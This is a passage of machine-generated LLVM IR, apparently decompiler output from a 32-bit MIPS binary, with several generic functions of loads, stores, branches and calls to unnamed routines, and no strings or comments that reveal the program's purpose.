  %v3_402600 = load i32, i32* %v2_402600, align 4
  %v1_402604 = add i32 %v0_402600, -32744
  %v2_402604 = inttoptr i32 %v1_402604 to i32*
  %v3_402604 = load i32, i32* %v2_402604, align 4
  store i32 %v3_402604, i32* %a0.global-to-local, align 4
  %v1_402608 = inttoptr i32 %v3_402600 to i16*
  %v2_402608 = load i16, i16* %v1_402608, align 2
  %v3_402608 = zext i16 %v2_402608 to i32
  %v1_40260c = add i32 %v3_402604, -25204
  %v2_40260c = inttoptr i32 %v1_40260c to i32*
  %v3_40260c = load i32, i32* %v2_40260c, align 4
  store i32 %v3_40260c, i32* %a1.global-to-local, align 4
  %v1_402610 = add nuw nsw i32 %v3_402608, 1
  %v2_402610 = trunc i32 %v1_402610 to i16
  store i16 %v2_402610, i16* %v1_402608, align 2
  %v0_402618 = load i32, i32* %s2.global-to-local, align 4
  %v1_402618 = load i32, i32* %a0.global-to-local, align 4
  %v2_402618 = add i32 %v1_402618, -25204
  %v3_402618 = inttoptr i32 %v2_402618 to i32*
  store i32 %v0_402618, i32* %v3_402618, align 4
  %v0_40261c = load i32, i32* %s2.global-to-local, align 4
  %v1_40261c = add i32 %v0_40261c, 8
  %v2_40261c = inttoptr i32 %v1_40261c to i32*
  store i32 0, i32* %v2_40261c, align 4
  %v0_402620 = load i32, i32* %s2.global-to-local, align 4
  %v1_402620 = load i32, i32* %a1.global-to-local, align 4
  %v2_402620 = add i32 %v1_402620, 8
  %v3_402620 = inttoptr i32 %v2_402620 to i32*
  store i32 %v0_402620, i32* %v3_402620, align 4
  ret i32 %v1_402610

; uselistorder directives
  uselistorder i32 %v0_4025f4, { 1, 0 }
  uselistorder i32 %v0_4025e0, { 1, 0 }
  uselistorder i32* %a2.global-to-local, { 1, 2, 3, 0 }
}

define i32 @function_402640(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_402640:
  %a0.global-to-local = alloca i32, align 4
  %s1.global-to-local = alloca i32, align 4
  %s2.global-to-local = alloca i32, align 4
  %v0.global-to-local = alloca i32, align 4
  %v1.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %a0.global-to-local, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %v0_40265c = load i32, i32* @s0, align 4
  store i32 %v0_40265c, i32* %stack_var_-16, align 4
  %v1_402668 = add i32 %arg1, 18
  store i32 %v1_402668, i32* @s0, align 4
  store i32 %arg1, i32* %s1.global-to-local, align 4
  store i32 %arg2, i32* %s2.global-to-local, align 4
  store i32 %v1_402668, i32* @a0, align 4
  store i32 1024, i32* @a2, align 4
  %v4_40267c = call i32 @function_404030(i32 %v1_402668, i32 0, i32 1024)
  %v2_402688 = ptrtoint i32* %stack_var_-144 to i32
  store i32 0, i32* %stack_var_-152, align 4
  store i32 %v2_402688, i32* %v0.global-to-local, align 4
  %v2_40269c = ptrtoint i32* %stack_var_-16 to i32
  store i32 %v2_40269c, i32* %v1.global-to-local, align 4
  br label %dec_label_pc_4026a0

dec_label_pc_4026a0:                              ; preds = %dec_label_pc_4026a0, %dec_label_pc_402640
  %v0_4026a0 = phi i32 [ %v1_4026a4, %dec_label_pc_4026a0 ], [ %v2_402688, %dec_label_pc_402640 ]
  %v1_4026a0 = inttoptr i32 %v0_4026a0 to i32*
  store i32 0, i32* %v1_4026a0, align 4
  %v0_4026a4 = load i32, i32* %v0.global-to-local, align 4
  %v1_4026a4 = add i32 %v0_4026a4, 4
  store i32 %v1_4026a4, i32* %v0.global-to-local, align 4
  %v1_4026a8 = load i32, i32* %v1.global-to-local, align 4
  %v2_4026a8 = icmp eq i32 %v1_4026a4, %v1_4026a8
  br i1 %v2_4026a8, label %dec_label_pc_4026ac, label %dec_label_pc_4026a0

dec_label_pc_4026ac:                              ; preds = %dec_label_pc_4026a0
  %v0_4026b0 = load i32, i32* %s1.global-to-local, align 4
  %v1_4026b0 = add i32 %v0_4026b0, 8
  %v2_4026b0 = inttoptr i32 %v1_4026b0 to i32*
  %v3_4026b0 = load i32, i32* %v2_4026b0, align 4
  store i32 %v3_4026b0, i32* %a0.global-to-local, align 4
  %v2_4026b4 = ptrtoint i32* %stack_var_-152 to i32
  %v1_4026b8 = udiv i32 %v3_4026b0, 32
  %v1_4026bc = mul nuw nsw i32 %v1_4026b8, 4
  %v2_4026c0 = add i32 %v1_4026bc, %v2_4026b4
  store i32 %v2_4026c0, i32* %v1.global-to-local, align 4
  %v1_4026c4 = add i32 %v2_4026c0, 8
  %v2_4026c4 = inttoptr i32 %v1_4026c4 to i32*
  %v3_4026c4 = load i32, i32* %v2_4026c4, align 4
  %v2_4026cc = shl i32 1, %v3_4026b0
  store i32 %v2_4026cc, i32* %v0.global-to-local, align 4
  %v2_4026d0 = or i32 %v3_4026c4, %v2_4026cc
  %v3_4026d4 = load i32, i32* @global_var_449ca0.122, align 4
  store i32 %v3_4026d4, i32* @t9, align 4
  store i32 %v2_4026d0, i32* %v2_4026c4, align 4
  %v0_4026dc = load i32, i32* %a0.global-to-local, align 4
  %v1_4026dc = add i32 %v0_4026dc, 1
  store i32 %v1_4026dc, i32* %a0.global-to-local, align 4
  %v6_4026ec = call i32 @function_4051d0(i32 %v1_4026dc, i32 %v2_402688, i32 0)
  store i32 %v6_4026ec, i32* %v0.global-to-local, align 4
  %v1_4026f8 = icmp slt i32 %v6_4026ec, 1
  br i1 %v1_4026f8, label %dec_label_pc_402760, label %dec_label_pc_4026fc

dec_label_pc_4026fc:                              ; preds = %dec_label_pc_4026ac
  %v3_402700 = load i32, i32* @global_var_449d14.110, align 4
  store i32 %v3_402700, i32* @t9, align 4
  %v0_402704 = load i32, i32* %s1.global-to-local, align 4
  %v1_402704 = add i32 %v0_402704, 8
  %v2_402704 = inttoptr i32 %v1_402704 to i32*
  %v3_402704 = load i32, i32* %v2_402704, align 4
  store i32 %v3_402704, i32* %a0.global-to-local, align 4
  %v0_402708 = load i32, i32* @s0, align 4
  %v6_40270c = inttoptr i32 %v0_402708 to i32*
  %v7_40270c = call i32 @function_405e50(i32 %v3_402704, i32* %v6_40270c, i32 1024, i32 16384, i32 ptrtoint (i32* @0 to i32))
  store i32 %v7_40270c, i32* @v0, align 4
  %v1_402718 = icmp slt i32 %v7_40270c, 1
  store i32 0, i32* @v1, align 4
  br i1 %v1_402718, label %dec_label_pc_402764, label %dec_label_pc_40271c

dec_label_pc_40271c:                              ; preds = %dec_label_pc_4026fc
  %v1_402728 = load i32, i32* %s2.global-to-local, align 4
  store i32 %v1_402728, i32* %a0.global-to-local, align 4
  %v2_402728 = call i32 @function_403f48()
  store i32 %v2_402728, i32* %v0.global-to-local, align 4
  %v0_402734 = load i32, i32* @s0, align 4
  store i32 %v0_402734, i32* %a0.global-to-local, align 4
  %v5_402744 = call i32 @function_404228(i32 %v0_402734, i32 1024, i32 %v1_402728, i32 %v2_402728)
  store i32 %v5_402744, i32* %v1.global-to-local, align 4
  store i32 -1, i32* %v0.global-to-local, align 4
  %v2_402758 = icmp eq i32 %v5_402744, -1
  br i1 %v2_402758, label %dec_label_pc_402760, label %dec_label_pc_402764

dec_label_pc_402760:                              ; preds = %dec_label_pc_40271c, %dec_label_pc_4026ac
  store i32 0, i32* %v1.global-to-local, align 4
  br label %dec_label_pc_402764

dec_label_pc_402764:                              ; preds = %dec_label_pc_40271c, %dec_label_pc_4026fc, %dec_label_pc_402760
  %v0_402774 = phi i32 [ %v5_402744, %dec_label_pc_40271c ], [ 0, %dec_label_pc_4026fc ], [ 0, %dec_label_pc_402760 ]
  store i32 %v0_402774, i32* %v0.global-to-local, align 4
  ret i32 %v0_402774

; uselistorder directives
  uselistorder i32 %v0_402774, { 1, 0 }
  uselistorder i32 %v3_4026b0, { 1, 0, 2 }
  uselistorder i32 %v1_4026a4, { 1, 2, 0 }
  uselistorder i32 %v2_402688, { 1, 0, 2 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-152, { 1, 0 }
  uselistorder i32* %v0.global-to-local, { 0, 1, 2, 7, 3, 4, 5, 6 }
  uselistorder i32* %a0.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_402764, { 2, 0, 1 }
}

define i32 @function_402780(i32 %arg1, i8 %arg2) local_unnamed_addr {
dec_label_pc_402780:
  %s1.global-to-local = alloca i32, align 4
  %tmp = sext i8 %arg2 to i32
  %v3_4027a0 = load i32, i32* @global_var_449bc8.116, align 4
  store i32 %v3_4027a0, i32* @t9, align 4
  store i32 %arg1, i32* %s1.global-to-local, align 4
  store i32 %tmp, i32* @s0, align 4
  %v5_4027ac = call i32 @function_4052b0(i32* null)
  %v0_4027b8 = load i32, i32* @s0, align 4
  %v1_4027b8 = trunc i32 %v0_4027b8 to i8
  %v3_4027b8 = add i32 %arg1, 16
  %v4_4027b8 = inttoptr i32 %v3_4027b8 to i8*
  store i8 %v1_4027b8, i8* %v4_4027b8, align 1
  %v1_4027bc = load i32, i32* %s1.global-to-local, align 4
  %v2_4027bc = add i32 %v1_4027bc, 12
  %v3_4027bc = inttoptr i32 %v2_4027bc to i32*
  store i32 %v5_4027ac, i32* %v3_4027bc, align 4
  ret i32 %v5_4027ac
}

define i32 @function_4027d4(i32 %arg1, i8 %arg2) local_unnamed_addr {
dec_label_pc_4027d4:
  %s1.global-to-local = alloca i32, align 4
  %v0.global-to-local = alloca i32, align 4
  %tmp = sext i8 %arg2 to i32
  %v0_4027e4 = load i32, i32* @ra, align 4
  %v0_4027e8 = load i32, i32* @s1, align 4
  %v0_4027ec = load i32, i32* @s0, align 4
  %v3_4027f4 = load i32, i32* @global_var_449bc8.116, align 4
  store i32 %v3_4027f4, i32* @t9, align 4
  store i32 %arg1, i32* %s1.global-to-local, align 4
  store i32 %tmp, i32* @s0, align 4
  %v5_402800 = call i32 @function_4052b0(i32* null)
  store i32 %v5_402800, i32* %v0.global-to-local, align 4
  %v1_40280c = add i32 %arg1, 8
  %v2_40280c = inttoptr i32 %v1_40280c to i32*
  %v3_40280c = load i32, i32* %v2_40280c, align 4
  %v3_402810 = load i32, i32* @global_var_449b1c.60, align 4
  store i32 %v3_402810, i32* @t9, align 4
  %v3_402818 = add i32 %arg1, 12
  %v4_402818 = inttoptr i32 %v3_402818 to i32*
  store i32 %v5_402800, i32* %v4_402818, align 4
  %v6_402818 = call i32 @function_404de0(i32 %v3_40280c)
  store i32 %v6_402818, i32* %v0.global-to-local, align 4
  %v0_402824 = load i32, i32* @s0, align 4
  %v1_402824 = trunc i32 %v0_402824 to i8
  %v2_402824 = load i32, i32* %s1.global-to-local, align 4
  %v3_402824 = add i32 %v2_402824, 17
  %v4_402824 = inttoptr i32 %v3_402824 to i8*
  store i8 %v1_402824, i8* %v4_402824, align 1
  %v0_402828 = load i32, i32* @s0, align 4
  %v1_402828 = icmp eq i32 %v0_402828, 0
  %v2_402828 = load i32, i32* %s1.global-to-local, align 4
  %v3_402828 = add i32 %v2_402828, 16
  %v4_402828 = inttoptr i32 %v3_402828 to i8*
  store i8 0, i8* %v4_402828, align 1
  br i1 %v1_402828, label %dec_label_pc_4027d4.dec_label_pc_402854_crit_edge, label %dec_label_pc_40282c

dec_label_pc_4027d4.dec_label_pc_402854_crit_edge: ; preds = %dec_label_pc_4027d4
  %v4_402860.pre = load i32, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_402854

dec_label_pc_40282c:                              ; preds = %dec_label_pc_4027d4
  %v0_402830 = load i32, i32* %s1.global-to-local, align 4
  %v1_402830 = add i32 %v0_402830, 1044
  %v2_402830 = inttoptr i32 %v1_402830 to i32*
  %v3_402830 = load i32, i32* %v2_402830, align 4
  store i32 %v3_402830, i32* %v0.global-to-local, align 4
  %v3_402834 = load i32, i32* @global_var_449b14.129, align 4
  store i32 %v3_402834, i32* @t9, align 4
  %v1_402838 = icmp eq i32 %v3_402830, 0
  br i1 %v1_402838, label %dec_label_pc_402854, label %dec_label_pc_40283c

dec_label_pc_40283c:                              ; preds = %dec_label_pc_40282c
  store i32 %v0_4027e4, i32* @ra, align 4
  store i32 %v0_4027e8, i32* @s1, align 4
  store i32 %v0_4027ec, i32* @s0, align 4
  %v5_40284c = call i32 @function_4064b0(i32 %v3_402830)
  store i32 %v5_40284c, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_402854

dec_label_pc_402854:                              ; preds = %dec_label_pc_4027d4.dec_label_pc_402854_crit_edge, %dec_label_pc_40282c, %dec_label_pc_40283c
  %v4_402860 = phi i32 [ %v4_402860.pre, %dec_label_pc_4027d4.dec_label_pc_402854_crit_edge ], [ 0, %dec_label_pc_40282c ], [ %v5_40284c, %dec_label_pc_40283c ]
  store i32 %v0_4027e8, i32* %s1.global-to-local, align 4
  ret i32 %v4_402860

; uselistorder directives
  uselistorder i32 %v0_4027e8, { 1, 0 }
  uselistorder i32* %v0.global-to-local, { 1, 0, 2, 3, 4 }
  uselistorder i32* %s1.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_402854, { 2, 1, 0 }
}

define i32 @function_402868(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_402868:
  %v3_402888 = load i32, i32* @global_var_449bc8.116, align 4
  store i32 %v3_402888, i32* @t9, align 4
  %v2_402894 = urem i32 %arg2, 65536
  store i32 %v2_402894, i32* @s0, align 4
  %v5_402894 = call i32 @function_4052b0(i32* null)
  %v1_40289c = add i32 %arg1, 12
  %v2_40289c = inttoptr i32 %v1_40289c to i32*
  %v3_40289c = load i32, i32* %v2_40289c, align 4
  %v0_4028a4 = load i32, i32* @s0, align 4
  %v2_4028a4 = add i32 %v0_4028a4, %v3_40289c
  %v2_4028a8 = icmp slt i32 %v2_4028a4, %v5_402894
  %v1_4028b0 = icmp eq i1 %v2_4028a8, false
  br i1 %v1_4028b0, label %dec_label_pc_402868.dec_label_pc_4028d4_crit_edge, label %dec_label_pc_4028b4

dec_label_pc_402868.dec_label_pc_4028d4_crit_edge: ; preds = %dec_label_pc_402868
  br label %dec_label_pc_4028d4

dec_label_pc_4028b4:                              ; preds = %dec_label_pc_402868
  %v3_4028b8 = load i32, i32* @global_var_449a80.88, align 4
  %v1_4028c8 = add i32 %v3_4028b8, 10196
  call void @__pseudo_branch(i32 %v1_4028c8)
  br label %dec_label_pc_4028d4

dec_label_pc_4028d4:                              ; preds = %dec_label_pc_402868.dec_label_pc_4028d4_crit_edge, %dec_label_pc_4028b4
  ret i32 %v5_402894

; uselistorder directives
  uselistorder i32 %v5_402894, { 1, 0 }
  uselistorder label %dec_label_pc_4028d4, { 1, 0 }
}

define i32 @function_4028e8(i32 %arg1) local_unnamed_addr {
dec_label_pc_4028e8:
  %a0.global-to-local = alloca i32, align 4
  %gp.global-to-local = alloca i32, align 4
  %s0.global-to-local = alloca i32, align 4
  %s1.global-to-local = alloca i32, align 4
  %s2.global-to-local = alloca i32, align 4
  %s4.global-to-local = alloca i32, align 4
  %s5.global-to-local = alloca i32, align 4
  %v0.global-to-local = alloca i32, align 4
  %v1.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %a0.global-to-local, align 4
  %tmp70 = call i32 @__decompiler_undefined_function_0()
  %tmp76 = call i32 @__decompiler_undefined_function_0()
  %tmp77 = call i32 @__decompiler_undefined_function_0()
  %tmp78 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-2319 = alloca i32, align 4
  %stack_var_-2320 = alloca i8, align 1
  %stack_var_-2332 = alloca i32, align 4
  %stack_var_-2328 = alloca i32, align 4
  %stack_var_-2336 = alloca i32, align 4
  %stack_var_-2244 = alloca i32, align 4
  %stack_var_-2312 = alloca i32, align 4
  %stack_var_-2276 = alloca i32, align 4
  %stack_var_-2116 = alloca i32, align 4
  %stack_var_-1092 = alloca i32, align 4
  %stack_var_-2296 = alloca i32, align 4
  %v1_4028f0 = load i32, i32* @t9, align 4
  %v2_4028f0 = add i32 %v1_4028f0, 323960
  store i32 %v2_4028f0, i32* %gp.global-to-local, align 4
  %v0_402918 = load i32, i32* @s1, align 4
  %v0_40291c = load i32, i32* @s0, align 4
  %v3_402924 = load i32, i32* @global_var_449c00.97, align 4
  store i32 %v3_402924, i32* @t9, align 4
  %v2_40292c = urem i32 %arg1, 256
  store i32 %v2_40292c, i32* @s6, align 4
  %v3_40292c = call i32 @function_404e40()
  store i32 %v2_4028f0, i32* %gp.global-to-local, align 4
  store i32 %v3_40292c, i32* %v1.global-to-local, align 4
  %v3_40293c = load i32, i32* bitcast (i32** @global_var_449bdc.126 to i32*), align 4
  store i32 %v3_40293c, i32* %v0.global-to-local, align 4
  %v1_402940 = icmp sgt i32 %v3_40292c, 0
  %v4_402940 = inttoptr i32 %v3_40293c to i32*
  store i32 %v3_40292c, i32* %v4_402940, align 4
  br i1 %v1_402940, label %dec_label_pc_4028e8.dec_label_pc_403cdc_crit_edge, label %dec_label_pc_402944

dec_label_pc_4028e8.dec_label_pc_403cdc_crit_edge: ; preds = %dec_label_pc_4028e8
  %v4_403d04.pre = load i32, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_403cdc

dec_label_pc_402944:                              ; preds = %dec_label_pc_4028e8
  store i32 -1, i32* %v0.global-to-local, align 4
  %v0_40294c = load i32, i32* %v1.global-to-local, align 4
  %v2_40294c = icmp eq i32 %v0_40294c, -1
  br i1 %v2_40294c, label %dec_label_pc_403cdc, label %dec_label_pc_402950

dec_label_pc_402950:                              ; preds = %dec_label_pc_402944
  %v3_402954 = load i32, i32* @global_var_449c28.96, align 4
  store i32 %v3_402954, i32* @t9, align 4
  %v1_40295c = call i32 @function_401e78()
  store i32 %v1_40295c, i32* %v0.global-to-local, align 4
  store i32 %v2_4028f0, i32* %gp.global-to-local, align 4
  %v3_40296c = load i32, i32* @global_var_449d18.130, align 4
  store i32 %v3_40296c, i32* @t9, align 4
  %v1_402974 = call i32 @function_404ea0()
  store i32 %v1_402974, i32* %v0.global-to-local, align 4
  store i32 %v2_4028f0, i32* %gp.global-to-local, align 4
  store i32 84, i32* %a0.global-to-local, align 4
  %v3_402984 = load i32, i32* @global_var_449d24.131, align 4
  store i32 %v3_402984, i32* @t9, align 4
  store i32 %v1_402974, i32* @s1, align 4
  %v3_40298c = call i32 @function_406bf0(i32 84)
  store i32 %v3_40298c, i32* %v0.global-to-local, align 4
  store i32 %v2_4028f0, i32* %gp.global-to-local, align 4
  store i32 0, i32* %stack_var_-2336, align 4
  %v3_40299c = load i32, i32* @global_var_449c74.100, align 4
  store i32 %v3_40299c, i32* @t9, align 4
  store i32 %v3_40298c, i32* @s0, align 4
  %v3_4029a4 = call i32 @function_401d68()
  store i32 %v3_4029a4, i32* %v0.global-to-local, align 4
  store i32 %v2_4028f0, i32* %gp.global-to-local, align 4
  %v0_4029b0 = load i32, i32* @s0, align 4
  %v1_4029b0 = icmp slt i32 %v0_4029b0, 1
  store i32 %v3_4029a4, i32* @s2, align 4
  br i1 %v1_4029b0, label %dec_label_pc_403294, label %dec_label_pc_4029b4

dec_label_pc_4029b4:                              ; preds = %dec_label_pc_402950
  %v2_4029bc = icmp eq i32 %v0_4029b0, 1
  %. = select i1 %v2_4029bc, i32 500, i32 1000
  store i32 %., i32* %v1.global-to-local, align 4
  %v0_4029c8 = load i32, i32* @s1, align 4
  %v1_4029c8 = add i32 %v0_4029c8, 65436
  %v1_4029cc = urem i32 %v1_4029c8, 65536
  store i32 %v1_4029cc, i32* @s7, align 4
  %v2_4029d0 = icmp ult i32 %., %v1_4029cc
  %v3_4029d0 = zext i1 %v2_4029d0 to i32
  store i32 %v3_4029d0, i32* @v0, align 4
  %v1_4029d4 = icmp eq i1 %v2_4029d0, false
  br i1 %v1_4029d4, label %dec_label_pc_4029e0, label %dec_label_pc_4029d8

dec_label_pc_4029d8:                              ; preds = %dec_label_pc_4029b4
  store i32 %., i32* @s7, align 4
  br label %dec_label_pc_4029e0

dec_label_pc_4029e0:                              ; preds = %dec_label_pc_4029b4, %dec_label_pc_4029d8
  %v0_4029e4 = phi i32 [ %v1_4029cc, %dec_label_pc_4029b4 ], [ %., %dec_label_pc_4029d8 ]
  %v3_4029e0 = load i32, i32* @global_var_449c5c.121, align 4
  store i32 %v3_4029e0, i32* @t9, align 4
  store i32 %v0_4029e4, i32* %a0.global-to-local, align 4
  %v3_4029e862 = zext i32 %v0_4029e4 to i64
  %v4_4029e8 = call i32 @function_4063f0(i64 %v3_4029e862, i32 1048)
  store i32 %v4_4029e8, i32* @v0, align 4
  store i32 %v2_4028f0, i32* %gp.global-to-local, align 4
  %v3_4029f8 = load i32, i32* @global_var_449c5c.121, align 4
  store i32 %v3_4029f8, i32* @t9, align 4
  store i32 0, i32* %stack_var_-2332, align 4
  store i32 1, i32* %a0.global-to-local, align 4
  %v4_402a04 = call i32 @function_4063f0(i64 1, i32 2054)
  store i32 %v4_402a04, i32* @s1, align 4
  store i32 %v2_4028f0, i32* %gp.global-to-local, align 4
  %v0_402a18 = load i32, i32* @s6, align 4
  %v2_402a18 = icmp eq i32 %v0_402a18, 2
  store i32 3, i32* %v0.global-to-local, align 4
  br i1 %v2_402a18, label %dec_label_pc_402e0c, label %dec_label_pc_402a1c

dec_label_pc_402a1c:                              ; preds = %dec_label_pc_4029e0
  %v2_402a20 = icmp eq i32 %v0_402a18, 3
  store i32 1, i32* %v0.global-to-local, align 4
  br i1 %v2_402a20, label %dec_label_pc_402a24, label %dec_label_pc_402d60

dec_label_pc_402a24:                              ; preds = %dec_label_pc_402a1c
  %v0_402a30 = load i32, i32* @s2, align 4
  %v2_402a30 = zext i32 %v0_402a30 to i64
  %v4_402a30 = mul nuw i64 %v2_402a30, 3435973837
  %v3_402a34 = load i32, i32* @global_var_449cc8.132, align 4
  store i32 %v3_402a34, i32* @t9, align 4
  %v2_402a38 = ptrtoint i32* %stack_var_-2296 to i32
  store i32 %v2_402a38, i32* %a0.global-to-local, align 4
  %v1_402a402 = udiv i64 %v4_402a30, 17179869184
  %v1_402a40 = trunc i64 %v1_402a402 to i32
  store i32 %v1_402a40, i32* %v0.global-to-local, align 4
  %v1_402a444 = mul nuw nsw i64 %v1_402a402, 4
  %v1_402a44 = trunc i64 %v1_402a444 to i32
  %v2_402a48.neg = add i32 %v0_402a30, 5
  %v2_402a4c = sub i32 %v2_402a48.neg, %v1_402a40
  %v1_402a50 = sub i32 %v2_402a4c, %v1_402a44
  store i32 %v1_402a50, i32* @s0, align 4
  %v4_402a54 = bitcast i32* %stack_var_-2296 to i8*
  %v5_402a54 = call i32 @function_401dc4(i8* %v4_402a54, i32 %v1_402a50)
  store i32 %v2_4028f0, i32* %gp.global-to-local, align 4
  %v0_402a60 = load i32, i32* @sp, align 4
  %v1_402a60 = load i32, i32* @s0, align 4
  %v2_402a60 = add i32 %v1_402a60, %v0_402a60
  store i32 %v2_402a60, i32* %v0.global-to-local, align 4
  %v3_402a64 = load i32, i32* @global_var_449bb8.53, align 4
  store i32 %v3_402a64, i32* @t9, align 4
  %v1_402a68 = add i32 %v2_402a60, 80
  %v2_402a68 = inttoptr i32 %v1_402a68 to i8*
  store i8 0, i8* %v2_402a68, align 1
  store i32 28, i32* %a0.global-to-local, align 4
  %v2_402a6c = call i32 @function_4002d0(i32 28)
  store i32 %v2_402a6c, i32* %v0.global-to-local, align 4
  store i32 %v2_4028f0, i32* %gp.global-to-local, align 4
  %v3_402a7c = load i32, i32* @global_var_449bb8.53, align 4
  store i32 %v3_402a7c, i32* @t9, align 4
  store i32 27, i32* %a0.global-to-local, align 4
  %v2_402a84 = call i32 @function_4002d0(i32 27)
  store i32 %v2_402a84, i32* %v0.global-to-local, align 4
  store i32 %v2_4028f0, i32* %gp.global-to-local, align 4
  %v3_402a94 = load i32, i32* @global_var_449bb8.53, align 4
  store i32 %v3_402a94, i32* @t9, align 4
  store i32 29, i32* %a0.global-to-local, align 4
  %v2_402a9c = call i32 @function_4002d0(i32 29)
  store i32 %v2_402a9c, i32* %v0.global-to-local, align 4
  store i32 %v2_4028f0, i32* %gp.global-to-local, align 4
  %v3_402aac = load i32, i32* @global_var_449bb8.53, align 4
  store i32 %v3_402aac, i32* @t9, align 4
  store i32 30, i32* %a0.global-to-local, align 4
  %v2_402ab4 = call i32 @function_4002d0(i32 30)
  store i32 %v2_402ab4, i32* %v0.global-to-local, align 4
  store i32 %v2_4028f0, i32* %gp.global-to-local, align 4
  %v3_402ac4 = load i32, i32* @global_var_449ce0.54, align 4
  store i32 %v3_402ac4, i32* @t9, align 4
  store i32 30, i32* %a0.global-to-local, align 4
  %v2_402acc = call i32 @function_400564(i32 30)
  store i32 %v2_402acc, i32* %v0.global-to-local, align 4
  store i32 %v2_4028f0, i32* %gp.global-to-local, align 4
  store i32 28, i32* %a0.global-to-local, align 4
  %v3_402adc = load i32, i32* @global_var_449ce0.54, align 4
  store i32 %v3_402adc, i32* @t9, align 4
  %v6_402ae4 = call i32 @function_400564(i32 28)
  store i32 %v6_402ae4, i32* %v0.global-to-local, align 4
  store i32 %v2_4028f0, i32* %gp.global-to-local, align 4
  store i32 27, i32* %a0.global-to-local, align 4
  %v3_402af4 = load i32, i32* @global_var_449ce0.54, align 4
  store i32 %v3_402af4, i32* @t9, align 4
  store i32 %v6_402ae4, i32* @s2, align 4
  %v3_402afc = call i32 @function_400564(i32 27)
  store i32 %v3_402afc, i32* %v0.global-to-local, align 4
  store i32 %v2_4028f0, i32* %gp.global-to-local, align 4
  store i32 29, i32* %a0.global-to-local, align 4
  %v3_402b0c = load i32, i32* @global_var_449ce0.54, align 4
  store i32 %v3_402b0c, i32* @t9, align 4
  store i32 %v3_402afc, i32* @s0, align 4
  %v3_402b14 = call i32 @function_400564(i32 29)
  store i32 %v3_402b14, i32* @v0, align 4
  store i32 %v2_4028f0, i32* %gp.global-to-local, align 4
  %v3_402b24 = load i32, i32* @global_var_449d20.133, align 4
  store i32 %v3_402b24, i32* @t9, align 4
  %v1_402b2c = load i32, i32* @s0, align 4
  store i32 %v1_402b2c, i32* %a0.global-to-local, align 4
  %v3_402b2c = call i32 @function_401f28(i32 %v1_402b2c)
  store i32 %v3_402b2c, i32* @v0, align 4
  store i32 %v2_4028f0, i32* %gp.global-to-local, align 4
  %v1_402b38 = icmp eq i32 %v3_402b2c, 0
  %v3_402b38 = load i32, i32* @s1, align 4
  %v4_402b38 = inttoptr i32 %v3_402b38 to i32*
  store i32 %v3_402b2c, i32* %v4_402b38, align 4
  br i1 %v1_402b38, label %dec_label_pc_402c5c, label %dec_label_pc_402b3c

dec_label_pc_402b3c:                              ; preds = %dec_label_pc_402a24
  %v3_402b40 = load i32, i32* @global_var_449d20.133, align 4
  store i32 %v3_402b40, i32* @t9, align 4
  %v1_402b48 = load i32, i32* @s2, align 4
  store i32 %v1_402b48, i32* %a0.global-to-local, align 4
  %v3_402b48 = call i32 @function_401f28(i32 %v1_402b48)
  store i32 %v3_402b48, i32* @v0, align 4
  store i32 %v2_4028f0, i32* %gp.global-to-local, align 4
  %v1_402b54 = icmp eq i32 %v3_402b48, 0
  %v3_402b54 = load i32, i32* @s1, align 4
  %v4_402b54 = add i32 %v3_402b54, 4
  %v5_402b54 = inttoptr i32 %v4_402b54 to i32*
  store i32 %v3_402b48, i32* %v5_402b54, align 4
  br i1 %v1_402b54, label %dec_label_pc_402c5c, label %dec_label_pc_402b58

dec_label_pc_402b58:                              ; preds = %dec_label_pc_402b3c
  %v0_402b5c = load i32, i32* @s1, align 4
  %v1_402b5c = inttoptr i32 %v0_402b5c to i32*
  %v2_402b5c = load i32, i32* %v1_402b5c, align 4
  store i32 %v2_402b5c, i32* @v0, align 4
  %v1_402b64 = icmp eq i32 %v2_402b5c, 0
  br i1 %v1_402b64, label %dec_label_pc_402c5c, label %dec_label_pc_402b68

dec_label_pc_402b68:                              ; preds = %dec_label_pc_402b58
  %v3_402b70 = load i32, i32* @global_var_449b78.59, align 4
  store i32 %v3_402b70, i32* @t9, align 4
  %v2_402b74 = ptrtoint i32* %stack_var_-1092 to i32
  store i32 %v2_402b74, i32* %a0.global-to-local, align 4
  %v7_402b7c = bitcast i32* %stack_var_-1092 to i8*
  %v8_402b7c = call i32 @function_403fcc(i8* %v7_402b7c, i32 ptrtoint ([26 x i8]* @global_var_408660.134 to i32))
  store i32 %v8_402b7c, i32* %v0.global-to-local, align 4
  store i32 %v2_4028f0, i32* %gp.global-to-local, align 4
  %v0_402b88 = load i32, i32* @s1, align 4
  %v1_402b88 = add i32 %v0_402b88, 4
  %v2_402b88 = inttoptr i32 %v1_402b88 to i32*
  %v3_402b88 = load i32, i32* %v2_402b88, align 4
  store i32 %v3_402b88, i32* @a1, align 4
  store i32 %v2_402b74, i32* %a0.global-to-local, align 4
  %v6_402b94 = call i32 @function_403f6c(i8* %v7_402b7c, i32 %v3_402b88)
  store i32 %v6_402b94, i32* %v0.global-to-local, align 4
  store i32 %v2_4028f0, i32* %gp.global-to-local, align 4
  store i32 %v2_402b74, i32* %a0.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_40867c.136 to i32), i32* @a1, align 4
  %v8_402bb0 = call i32 @function_403f6c(i8* %v7_402b7c, i32 ptrtoint ([8 x i8]* @global_var_40867c.136 to i32))
  store i32 %v8_402bb0, i32* %v0.global-to-local, align 4
  store i32 %v2_4028f0, i32* %gp.global-to-local, align 4
  %v0_402bbc = load i32, i32* @s1, align 4
  %v1_402bbc = inttoptr i32 %v0_402bbc to i32*
  %v2_402bbc = load i32, i32* %v1_402bbc, align 4
  store i32 %v2_402bbc, i32* @a1, align 4
  store i32 %v2_402b74, i32* %a0.global-to-local, align 4
